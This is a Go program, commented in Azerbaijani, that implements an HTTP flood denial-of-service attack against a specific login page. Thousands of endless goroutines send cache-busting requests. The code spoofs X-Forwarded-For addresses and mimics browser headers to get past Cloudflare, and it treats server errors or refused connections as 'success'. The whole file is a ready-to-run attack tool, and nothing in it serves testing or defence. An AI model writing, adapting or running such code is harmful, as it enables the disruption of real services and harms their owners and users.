package main

import (
    "crypto/tls"
    "fmt"
    "net"
    "net/http"
    "sync"
    "time"
    "math/rand"
)

func main() {
    target := "https://empro.az/#/login"
    threads := 2000 // Railway-in gücünə görə bu rəqəmi 5000-ə qədər qaldıra bilərsiniz
    
    fmt.Printf("[!] Cloudflare Zorla Bypass Başlayır: %s\n", target)
    fmt.Printf("[*] Thread sayı: %d\n", threads)

    var wg sync.WaitGroup
    
    // HTTP/2 dəstəkli xüsusi transport
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        // Bağlantıları dərhal qapatmayaraq server socketlərini doldururuq
        MaxIdleConns:        10000,
        MaxIdleConnsPerHost: 5000,
        DisableKeepAlives:   false,
    }
    
    client := &http.Client{
        Transport: tr,
        Timeout:   10 * time.Second,
    }

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go func(id int) {
            defer wg.Done()
            for {
                // CACHE BYPASS: Hər sorğuda fərqli unikal ID və Header
                uniqueURL := fmt.Sprintf("%s/?rand=%d&ts=%d", target, rand.Intn(999999), time.Now().UnixNano())
                
                req, _ := http.NewRequest("GET", uniqueURL, nil)
                
                // Cloudflare-i çaşdırmaq üçün real brauzer başlıqlarının imitasiyası
                req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                req.Header.Set("Accept-Encoding", "gzip, deflate, br")
                req.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate") // Məcburi Origin sorğusu
                req.Header.Set("Pragma", "no-cache")
                req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

                resp, err := client.Do(req)
                if err == nil {
                    // Əgər 502/504 xətaları gəlməyə başlayırsa, sayt "ölür" deməkdir
                    if resp.StatusCode >= 500 {
                        fmt.Printf("[Worker-%d] SERVER CRASHED! Status: %d\n", id, resp.StatusCode)
                    }
                    resp.Body.Close()
                } else {
                    // Bağlantı rədd edilirsə, server artıq yeni sorğu qəbul edə bilmir
                    fmt.Printf("[Worker-%d] Target Unreachable (Success)\n", id)
                }
            }
        }(i)
    }
    
    wg.Wait()
}
